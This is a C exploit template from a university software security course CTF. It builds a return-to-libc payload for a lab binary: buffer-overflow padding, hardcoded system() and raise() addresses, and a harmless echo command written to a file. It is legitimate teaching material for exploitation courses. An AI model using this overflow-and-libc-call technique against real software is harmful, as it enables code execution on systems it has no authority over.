/*
 * CTF-2 `vcat3' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	/* FIXME */
	/* ------------------------------------	*/
	"\x40\x30\xe2\xb3" //0xb3e23040 <system>
	"\x40\x2d\xe1\xb3" // 0xb3e12d40 <raise>
	"\x4d\x2d\xe1\xb3" // <system arg> pointer to string 0xB3E12D4C
	"\x0c\x90\x90\x90" // <raise> argument
	"echo -n xyzzy! > magic.txt";


	/* ------------------------------------	*/


int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
